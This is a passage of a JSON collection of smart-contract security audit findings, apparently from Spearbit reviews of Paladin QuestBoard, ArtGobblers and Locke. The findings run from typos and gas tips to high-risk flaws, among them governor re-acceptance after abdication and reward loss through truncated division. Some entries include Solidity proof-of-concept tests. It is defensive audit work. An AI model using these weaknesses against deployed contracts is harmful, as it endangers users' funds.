        "body": "The functions increaseQuestReward() and increaseQuestObjective() check: newRewardPerVote > periodsByQuest[questID][currentPeriod].rewardPerVote. This is true when the quest is in the past (e.g. currentPeriod is outside of the quest range), because all the values will be 0. Luckily execution is stopped at _getRemainingDuration(questID), however it would be more logical to put this check near the start of the function. function increaseQuestReward(...) ... { updatePeriod(); ... require(newRewardPerVote > periodsByQuest[questID][currentPeriod].rewardPerVote, \"QuestBoard: New reward must be higher\"); ... uint256 remainingDuration = _getRemainingDuration(questID); require(remainingDuration > 0, \"QuestBoard: no more incoming QuestPeriods\"); ... ,! } The function _getRemainingDuration() reverts when the quest is in the past, as currentPeriod will be larger than lastPeriod. The is not what you would expect from this function. function _getRemainingDuration(uint256 questID) internal view returns(uint256) { uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; return (lastPeriod - currentPeriod) / WEEK; // can revert }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Should make use of token.balanceOf(address(this)); to recover tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Currently when calling the recoverERC20() function there is no way to calculate what the proper amount should be without having to check the contracts balance of token before hand. This will require an extra step and can be easily done inside the function itself.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Floating pragma is set",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The current pragma Solidity directive is ^0.8.10. It is recommended to specify a specific compiler version to ensure that the byte code produced does not vary between builds. Contracts should be deployed using the same compiler version/flags with which they have been tested. Locking the pragma (for e.g. by not using ^ in pragma solidity 0.8.10) ensures that contracts do not accidentally get deployed using an older compiler version with known compiler bugs.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Deflationary reward tokens are not handled uniformly across the protocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The code base does not support rebasing/deflationary/inflationary reward tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typo on comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Across the codebase, there is a typo on the comment. The comment can be seen from the below. * @dev Returns the number of periods to come for a give nQuest",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Require statement with gauge_types function call is redundant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The gauge_types function of the Curve reverts when an invalid gauge is given as a parameter, the QuestBoard: Invalid Gauge error message will not be seen in the QuestBoard contract. The documentation can be seen from the Querying Gauge and Type Weights. function createQuest(...) ... { ... require(IGaugeController(GAUGE_CONTROLLER).gauge_types(gauge) >= 0, \"QuestBoard: Invalid Gauge\"); ... }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing setter function for the GAUGE_CONTROLLER",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The GAUGE_CONTROLLER address is immutable and set in the constructor. If Curve adds a new version of the gauge controller, the value of GAUGE_CONTROLLER cannot be updated and the contract QuestBoard needs to be deployed again. address public immutable GAUGE_CONTROLLER; constructor(address _gaugeController, address _chest){ GAUGE_CONTROLLER = _gaugeController; ... }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Empty events emitted in killBoard() and unkillBoard() functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "When an event is emitted, it stores the arguments passed in for the transaction logs. Currently the Killed() and Unkilled() events are emitted without any arguments passed into them defeating the purpose of using an event.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "The claimGobbler function does not enforce the MINTLIST_SUPPLY on-chain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "There is a public constant MINTLIST_SUPPLY (2000) that is supposed to represent the number of gobblers that can be minted by using merkle proofs. However, this is not explicitly enforced in the claimGobbler function and will need to be verified off-chain from the list of merkle proof data. The risk lies in the possibility of having more than 2000 proofs.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Feeding a gobbler to itself may lead to an infinite loop in the off-chain renderer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The contract allows feeding a gobbler to itself and while we do not think such action causes any issues on the contract side, it will nevertheless cause potential problems with the off-chain rendering for the gob- blers. The project explicitly allows feeding gobblers to other gobblers. In such cases, if the off-chain renderer is designed to render the inner gobbler, it would cause an infinite loop for the self-feeding case. Additionally, when a gobbler is fed to another gobbler the user will still own one of the gobblers. However, this is not the case with self-feeding,.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The function toString() does not manage memory properly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "There are two issues with the toString() function: 1. It does not manage the memory of the returned string correctly. In short, there can be overlaps between memory allocated for the returned string and the current free memory. 2. It assumes that the free memory is clean, i.e., does not explicitly zero out used memory. Proof of concept for case 1: function testToStringOverwrite() public { string memory str = LibString.toString(1); uint freememptr; uint len; bytes32 data; uint raw_str_ptr; assembly { // Imagine a high level allocation writing something to the current free memory. // Should have sufficient higher order bits for this to be visible mstore(mload(0x40), not(0)) freememptr := mload(0x40) // Correctly allocate 32 more bytes, to avoid more interference mstore(0x40, add(mload(0x40), 32)) raw_str_ptr := str len := mload(str) data := mload(add(str, 32)) } emit log_named_uint(\"memptr: \", freememptr); emit log_named_uint(\"str: \", raw_str_ptr); emit log_named_uint(\"len: \", len); emit log_named_bytes32(\"data: \", data); } Logs: memptr: : 256 str: : 205 len: : 1 data: : 0x31000000000000000000000000000000000000ffffffffffffffffffffffffff The key issue here is that the function allocates and manages memory region [205, 269) for the return variable. However, the free memory pointer is set to 256. The memory between [256, 269) can refer to both the string and another dynamic type that's allocated later on. Proof of concept for case 2: 5 function testToStringDirty() public { uint freememptr; // Make the next 4 bytes of the free memory dirty assembly { let dirty := not(0) freememptr := mload(0x40) mstore(freememptr, dirty) mstore(add(freememptr, 32), dirty) mstore(add(freememptr, 64), dirty) mstore(add(freememptr, 96), dirty) mstore(add(freememptr, 128), dirty) } string memory str = LibString.toString(1); uint len; bytes32 data; assembly { freememptr := str len := mload(str) data := mload(add(str, 32)) } emit log_named_uint(\"str: \", freememptr); emit log_named_uint(\"len: \", len); emit log_named_bytes32(\"data: \", data); assembly { freememptr := mload(0x40) } emit log_named_uint(\"memptr: \", freememptr); } Logs: str: 205 len: : 1 data: : 0x31ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff memptr: : 256 In both cases, high level solidity will not have issues decoding values as this region in memory is meant to be empty. However, certain ABI decoders, notably Etherscan, will have trouble decoding them. Note: It is likely that the use of toString() in ArtGobblers will not be impacted by the above issues. However, these issues can become severe if LibString is used as a generic string library.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Consider migrating all require statements to Custom Errors for gas optimization, better UX, DX and code consistency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "There is a mixed usage of both require and Custom Errors to handle cases where the transaction must revert. We suggest replacing all require instances with Custom Errors in order to save gas and improve user / developer experience. The following is a list of contract functions that still use require statements:  ArtGobblers mintLegendaryGobbler  ArtGobblers safeBatchTransferFrom  ArtGobblers safeTransferFrom  SignedWadMath wadLn  GobblersERC1155B balanceOfBatch  GobblersERC1155B _mint  GobblersERC1155B _batchMint  PagesERC721 ownerOf  PagesERC721 balanceOf  PagesERC721 approve  PagesERC721 transferFrom  PagesERC721 safeTransferFrom  PagesERC721 safeTransferFrom (overloaded version)",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Minting of Gobbler and Pages can be further gas optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "Currently, in order to mint a new Page or Gobbler users must have enough $GOO in their Goo contract balance. If the user does not have enough $GOO he/she must call ArtGobblers.removeGoo(amount) to remove the required amount from the Gobbler's balance and mint new $GOO. That $GOO will be successively burned to mint the Page or Gobbler. In the vast majority of cases users will never have $GOO in the Goo contract but will have their $GOO directly stacked inside their Gobblers to compound and maximize the outcome. Given these premises, it makes sense to implement a function that does not require users to make two distinct transactions to perform:  mint $GOO (via removeGoo).  burn $GOO + mint the Page/Gobbler (via mintFromGoo). 7 but rather use a single transaction that consumes the $GOO stacked on the Gobbler itself without ever minting and burning any $GOO from the Goo contract. By doing so, the user will perform the mint operation with only one transaction and the gas cost will be much lower because it does not require any interaction with the Goo contract.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Declare GobblerReserve artGobblers as immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The artGobblers in the GobblerReserve can be declared as immutable to save gas. - ArtGobblers public artGobblers; + ArtGobblers public immutable artGobblers;",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Neither GobblersERC1155B nor ArtGobblers implement the ERC-165 supportsInterface function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "From the EIP-1155 documentation: Smart contracts implementing the ERC-1155 standard MUST implement all of the functions in the ERC1155 interface. Smart contracts implementing the ERC-1155 standard MUST implement the ERC- 165 supportsInterface function and MUST return the constant value true if 0xd9b67a26 is passed through the interfaceID argument. Neither GobblersERC1155B nor ArtGobblers are actually implementing the ERC-165 supportsInterface function. implementing the required ERC-165 supportsInterface function in the",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "LogisticVRGDA is importing wadExp from SignedWadMath but never uses it",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The LogisticVRGDA is importing the wadExp function from the SignedWadMath library but is never used.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Pages.tokenURI does not revert when pageId is the ID of an invalid or not minted token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The current implementation of tokenURI in Pages is returning an empty string if the pageId specified by the user's input has not been minted yet (pageId > currentId). Additionally, the function does not correctly handle the case of a special tokenId equal to 0, which is an invalid token ID given that the first mintable token would be the one with ID equal to 1. The EIP-721 documentation specifies that the contract should revert in this case: Throws if _tokenId is not a valid NFT. URIs are defined in RFC 3986.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider checking if the token fed to the Gobbler is a real ERC1155 or ERC721 token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The current implementation of ArtGobblers.feedArt function allows users to specify from the value of the bool isERC1155 input parameter if the id passed is from an ERC721 or ERC1155 type of token. Without checking if the passed nft address fully support ERC721 or ERC1155 these two problems could arise:  The user can feed to a Gobbler an arbitrary ERC20 token by calling gobblers.feedArt(1, address(goo), 100, false);. In this example, we have fed 100 $GOO to the gobbler.  By just implementing safeTransferFrom or transferFrom in a generic contract, the user can feed tokens that cannot later be rendered by a Dapp because they do not fully support ERC721 or ERC1155 standard.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rounding down in legendary auction leads to legendaryGobblerPrice being zero earlier than the auction interval",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The expression below rounds down. startPrice * (LEGENDARY_AUCTION_INTERVAL - numMintedSinceStart)) / LEGENDARY_AUCTION_INTERVAL In particular, this expression has a value 0 when numMintedSinceStart is between 573 and 581 (LEGENDARY_- AUCTION_INTERVAL).",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos in code comments or natspec comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "Below is a list of typos encountered in the code base and / or natspec comments:  In both Pages.sol#L179 and Pages.sol#L188 replace compromise with comprise  In Pages.sol#L205 replace pages's URI with page's URI  In LogisticVRGDA.sol#L23 replace effects with affects  In VRGDA.sol#L34 replace actions with auctions  In ArtGobblers.sol#L54, ArtGobblers.sol#L745 and ArtGobblers.sol#L754 replace compromise with comprise  In ArtGobblers.sol#L606 remove the double occurrence of the word state  In ArtGobblers.sol#L871 replace emission's with emission  In ArtGobblers.sol#L421 replace gobblers is minted with gobblers are minted and until all legen- daries been sold with until all legendaries have been sold  In ArtGobblers.sol#L435-L436 replace gobblers where minted with gobblers were minted and if auc- tion has not yet started with if the auction has not yet started  In ArtGobblers.sol#L518 replace overflow we've got bigger problems with overflow, we've got big- ger problems  In ArtGobblers.sol#L775 and ArtGobblers.sol#L781 replace get emission emissionMultiple with get emissionMultiple",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing natspec comments for contract's constructor, variables or functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "Some of the contract's constructor variables and functions are missing natespec comments. Here is the full list of them:  Pages constructor  Pages getTargetSaleDay function  LibString toString function  MerkleProofLib verify function  SignedWadMath toWadUnsafe function  SignedWadMath unsafeWadMul function  SignedWadMath unsafeWadDiv function  SignedWadMath wadMul function  SignedWadMath wadDiv function  SignedWadMath wadExp function  SignedWadMath wadLn function  SignedWadMath unsafeDiv function  VRGDA constructor  LogisticVRGDA constructor  LogisticVRGDA getTargetDayForNextSale  PostSwitchVRGDA constructor  PostSwitchVRGDA getTargetDayForNextSale  GobblerReserve artGobblers  GobblerReserve constructor  GobblersERC1155B contract is missing natspec's coverage for most of the variables and functions  PagesERC721 contract is missing natspec's coverage for most of the variables and functions  PagesERC721 isApprovedForAll should explicity document the fact that the ArtGobbler contract is always pre-approved  ArtGobblers chainlinkKeyHash variable  ArtGobblers chainlinkFee variable  ArtGobblers constructor  ArtGobblers gobblerPrice miss the @return natspec  ArtGobblers legendaryGobblerPrice miss the @return natspec  ArtGobblers requestRandomSeed miss the @return natspec  ArtGobblers fulfillRandomness miss both the @return and @param natspec  ArtGobblers uri miss the @return natspec  ArtGobblers gooBalance miss the @return natspec  ArtGobblers mintReservedGobblers miss the @return natspec  ArtGobblers getGobblerEmissionMultiple miss the @return natspec 11  ArtGobblers getUserEmissionMultiple miss the @return natspec  ArtGobblers safeBatchTransferFrom miss all natspec  ArtGobblers safeTransferFrom miss all natspec  ArtGobblers transferUserEmissionMultiple miss @notice natspec",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Potential issues due to slippage when minting legendary gobblers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The price of a legendary mint is a function of the number of gobblers minted from goo. Because of the strict check that the price is exactly equal to the number of gobblers supplied, this can lead to slippage issues. That is, if there is a transaction that gets mined in the same block as a legendary mint, and before the call to mintLegendaryGobbler, the legendary mint will revert. uint256 cost = legendaryGobblerPrice(); if (gobblerIds.length != cost) revert IncorrectGobblerAmount(cost);",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Users who claim early have an advantage in goo production",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The gobblers are revealed in ascending order of the index in revealGobblers. However, there can be cases when this favours users who were able to claim early: 1. There is the trivial case where a user who claimed a day earlier will have an advantage in gooBalance as their emission starts earlier. 2. For users who claimed the gobblers on the same day (in the same period between a reveal) the advantage depends on whether the gobblers are revealed in the same block or not. 1. If there is a large number of gobbler claims between two aforementioned gobblers, then it may not be possible to call revealGobblers, due to block gas limit. 2. A user at the beginning of the reveal queue may call revealGobblers for enough indices to reveal their gobbler early. In all of the above cases, the advantage is being early to start the emission of the Goo.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add a negativity check for decayConstant in the constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "Price is designed to decay as time progresses. For this, it is important that the constant decayCon- stant is negative. Since the value is derived using an on-chain logarithm computation once, it is useful to check that the value is negative. Also, typically decay constant is positive, for example, in radioactive decay the negative sign is explicitly added in the function. It is worth keeping the same convention here, i.e., keep decayConstant as a positive number and add the negative sign in getPrice function. However, this may cause a small increase in gas and therefore may not be worth implementing in the end.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consideration on possible Chainlink integration concerns",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The ArtGobbler project relies on the Chainlink v1 VRF service to reveal minted gobblers and assign a random emissionMultiple that can range from 6 to 9. The project has estimated that minting and revealing all gobblers will take about 10 years. In the scenario simulated by the discussion \"Test to mint and reveal all the gobblers\" the number of requestRan- domSeed and fulfillRandomness made to reveal all the minted gobblers were more than 1500. Given the timespan of the project, the number of requests made to Chainlink to request a random number and the fundamental dependency that Chainlink VRF v1 has, we would like to highlight some concerns:  What would happen if Chainlink completely discontinues the Chainlink VRF v1? At the current moment, Chainlink has already released VRF v2 that replaces and enhances VRF v1.  What would happen in case of a Chainlink service outage and for some reason they decide not to pro- cess previous requests? Currently, the ArtGobbler contract does not allow to request a new \"request for randomness\". 13  What if the fulfillRandomness always gets delayed by a long number of days and users are not able to reveal their gobblers? This would not allow them to know the value of the gobbler (rarity and the visual representation) and start compounding $GOO given the fact that the gobbler does not have an emission multiple associated yet.  What if for error or on purpose (malicious behavior) a Chainlink operator calls fulfillRandomness multi- ple times changing the randomSeed during a reveal phase (the reveal of X gobbler can happen in multiple stages)?",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "The function toString() does not return a string aligned to a 32-byte word boundary",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "It is a good practice to align memory regions to 32-byte word boundaries. This is not necessarily the case here. However, we do not think this can lead to issues.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Considerations on Legendary Gobbler price mechanics",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The auction price model is made in a way that starts from a startPrice and decays over time. Each time a new action starts the price time will be equal to max(69, prevStartPrice * 2). Users in this case are incentivized to buy the legendary gobbler as soon as the auction starts because by doing so they are going to burn the maximum amount allowed of gobblers, allowing them to maximize the final emission multiple of the minted legendary gobbler. By doing this, you reach the end goal of maximizing the account's $GOO emissions. By waiting, the cost price of the legendary gobbler decays, and it also decays the emission multiple (because you can burn fewer gobblers). This means that if a user has enough gobblers to burn, he/she will burn them as soon as the auction starts. Another reason to mint a legendary gobbler as soon as the auction starts (and so burn as many gobblers as possible) is to make the next auction starting price as high as possible (always for the same reason, to be able to maximize the legendary gobbler emissions multiple). The next auction starting price is determined by legendaryGobblerAuctionData.startPrice = uint120(cost < 35 ? 69 : cost << 1); These mechanisms and behaviors can result in the following consequences:  Users that will have a huge number of gobblers will burn them as soon as possible, disallowing others that can't afford it to wait for the price to decay.  There will be less and less \"normal\" gobblers available to be used as part of the \"art\" aspect of the project. In the discussion \"Test to mint and reveal all the gobblers\" we have simulated a scenario in which a whale would be interested to collect all gobblers with the end goal of maximizing $GOO production. In that scenario, when the last Legendary Gobbler is minted we have estimated that 9644 gobbler have been burned to mint all the legendaries. 14",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Define a LEGENDARY_GOBBLER_INITIAL_START_PRICE constant to be used instead of hardcoded 69",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "69 is currently the starting price of the first legendary auction and will also be the price of the next auction if the previous one (that just finished) was lower than 35. There isn't any gas benefit to use a constant variable but it would make the code cleaner and easier to read instead of having hard-coded values directly.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Update ArtGobblers comments about some variable/functions to make them more clear",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "Some comments about state variables or functions could be improved to make them clearer or remove any further doubts. LEGENDARY_AUCTION_INTERVAL /// @notice Legendary auctions begin each time a multiple of these many gobblers have been minted. It could make sense that this comment specifies \"minted from Goo\" otherwise someone could think that also the \"free\" mints (mintlist, legendary, reserved) could count to determine when a legendary auction start. EmissionData.lastTimestamp // Timestamp of last deposit or withdrawal. These comments should be updated to cover all the scenarios where lastBalance and lastTimestamp are up- dated. Currently, they are updated in many more cases for example:  mintLegendaryGobbler  revealGobblers  transferUserEmissionMultiple getGobblerData[gobblerId].emissionMultiple = uint48(burnedMultipleTotal << 1) has an outdated comment. The current present in the mintLegendaryGobbler function has the following comment: line getGobblerData[gobblerId].emissionMultiple = uint48(burnedMultipleTotal << 1) // Must be done before minting as the transfer hook will update the user's emissionMultiple. In both ArtGobblers and GobblersERC1155B there isn't any transfer hook, which could mean that the referred comment is referencing outdated code. We suggest removing or updating the comment to reflect the current code implementation. legendaryGobblerPrice numMintedAtStart calculation. 15 The variable numMintedAtStart is calculated as (numSold + 1) * LEGENDARY_AUCTION_INTERVAL The comment above the formula does not explain why it uses (numSold + 1) instead of numSold. This reason is correctly explained by a comment on LEGENDARY_AUCTION_INTERVAL declaration. It would be better to also update the comment related to the calculation of numMintedAtStart to explain why the current formula use (numSold + 1) instead of just numSold transferUserEmissionMultiple The above utility function transfers an amount of a user's emission's multiple to another user. Other than transfer- ring that emission amount, it also updates both users lastBalance and lastTimestamp The natspec comment should be updated to cover this information.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "Mark functions not called internally as external to improve code quality",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The following functions could be declared as external to save gas and improve code quality:  Goo.mintForGobblers  Goo.burnForGobblers  Goo.burnForPages  GobblerReserve.withdraw",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Informational"
        ]
    },
    {
        "title": "UnaccruedSeconds do not increase even if nobody is actively staking",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "The unstreamed variable tracks whether someone is staking in the contract or not. However, because of the division precision loss at Locke.sol#L164-L166 and Locke.sol#L187, unstreamed > 0 may happen even when everyone has already withdrawn all deposited tokens from the contract, i.e. ts.token = 0 for everyone. Consider the following proof of concept with only two users, Alice and Bob:  streamDuration = 8888  At t = startTime, Alice stakes 1052 wei of deposit tokens.  At t = startTime + 99, Bob stakes 6733 wei of deposit tokens.  At t = startTime + 36, both Alice and Bob exits from the contract. At this point Alices and Bobs ts.tokens are both 0 but unstreamed = 1 wei. The abovementined numbers are the resault of a fuzzing campaign and were not carefully crafted, therefore this issue can also occur under normal circumstances. function updateStreamInternal() internal { ... uint256 tdelta = timestamp - lastUpdate; if (tdelta > 0) { if (unstreamed == 0) { unaccruedSeconds += uint32(tdelta); } else { unstreamed -= uint112(tdelta * unstreamed / (endStream - lastUpdate)); } } ... }",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Old governor can call acceptGov() after renouncing its role through _abdicate()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "The __abdicate function does not reset pendingGov value to 0. Therefore, if a pending governor is set the user can become a governor by calling acceptGov.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: High Risk"
        ]
    },
    {
        "title": "User can lose their reward due truncated division",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "The truncated division can cause users to lose rewards in this update round which may happen when any of the following conditions are true: 1. RewardToken.decimals() is too low. 2. Reward is updated too frequently. 3. StreamDuration is too large. 4. TotalVirtualBalance is too large (e.g., stake near the end of stream). This could potentially happen especially when the 1st case is true. Consider the following scenario:  rewardToken.decimals() = 6.  depositToken.decimals() can be any (assume its 18).  rewardTokenAmount = 1K * 10**6.  streamDuration = 1209600 (two weeks).  totalVirtualBalance = streamDuration * depositTokenAmount / timeRemaining where depositToken- Amount = 100K 10**18 and timeRemaining = streamDuration (a user stakes 100K at the beginning of the stream) lastApplicableTime() - lastUpdate = 100 (about 7 block-time). Then rewards = 100 * 1000 * 10**6 * 10**18 / 1209600 / (1209600 * 100000 * 10**18 / 1209600) = 0.8267 < 1. User wants to buy the reward token at the price of 100K/1K = 100 deposit token but does not get any because of the truncated division. function rewardPerToken() public override view returns (uint256) { if (totalVirtualBalance == 0) { return cumulativeRewardPerToken; } else { // time*rewardTokensPerSecond*oneDepositToken / totalVirtualBalance uint256 rewards; unchecked { rewards = (uint256(lastApplicableTime() - lastUpdate) * rewardTokenAmount * ,! depositDecimalsOne) / streamDuration / totalVirtualBalance; } return cumulativeRewardPerToken + rewards; } }",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: High Risk"
        ]
    },
    {
        "title": "The streamAmt check may prolong a user in the stream",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "Assume that the amount of tokens staked by a user (ts.tokens) is low. This check allows another person to deposit a large stake in order to prolong the user in a stream (untilstreamAmt for the user becomes non-zero). For this duration the user would be receiving a bad rate or 0 altogether for the reward token while being unable to exit from the pool. if (streamAmt == 0) revert ZeroAmount(); Therefore, if Alice stakes a small amount of deposit token and Bob comes along and deposits a very large amount of deposit token, tts in Alices interest to exit the pool as early as possible especially when this is an indefinite stream. Otherwise the user would be receiving a bad rate for their deposit token.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "User can stake before the stream creator produced a funding stream",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "Consider the following scenario: 1. Alice stakes in a stream before the stream starts. 2. Nobody funds the stream,. 3. In case of an indefinite stream Alice loses some of her deposit depending on when she exits the stream. For a usual stream Alice will have her deposit tokens locked until endDepositLock.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Potential funds locked due low token decimal and long stream duration",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "In case where the deposit token decimal is too low (4 or less) or when the remaining stream duration is too long, checking streamAmt > 0 may affect regular users. They could be temporarily blocked by the contract, i.e. they cannot stake, withdraw, or get rewards, and should wait until streamAmt > 0 or the stream ends. Altough unlikely to happen it still is a potential lock of funds issue. 11 function updateStreamInternal() internal { ... if (acctTimeDelta > 0) { if (ts.tokens > 0) { uint112 streamAmt = uint112(uint256(acctTimeDelta) * ts.tokens / (endStream - ,! ts.lastUpdate)); if (streamAmt == 0) revert ZeroAmount(); ts.tokens -= streamAmt; } ... }",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Sanity check on the reward tokens decimals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
